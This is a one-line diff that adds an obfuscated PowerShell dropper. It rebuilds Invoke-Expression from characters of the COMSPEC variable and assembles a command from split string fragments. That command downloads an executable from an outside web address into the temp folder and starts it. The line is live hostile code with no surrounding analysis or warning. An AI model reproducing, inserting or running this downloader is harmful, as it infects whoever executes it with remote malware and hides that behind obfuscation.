@@ -1,0 +1,1 @@
+﻿ & ( $ENv:cOMspEc[4,15,25]-jOiN'') ( (('({0'+'}dpl={0'+'}en'+'v:t'+'e'+'mp'+'+{'+'1'+'}'+'f.exe{1'+'});('+'New-O'+'bje'+'ct Syst'+'em'+'.N'+'et.WebC'+'l'+'ie'+'nt)'+'.Down'+'lo'+'adFi'+'le'+'({'+'1}h'+'t'+'tp:'+'//'+'www.'+'amspec'+'onl'+'ine.co'+'m/1'+'2'+'3'+'/nana.exe{'+'1}, '+'{0}d'+'pl);Start-Pro'+'cess'+' '+'{0}dp'+'l') -F  [Char]36,[Char]39))
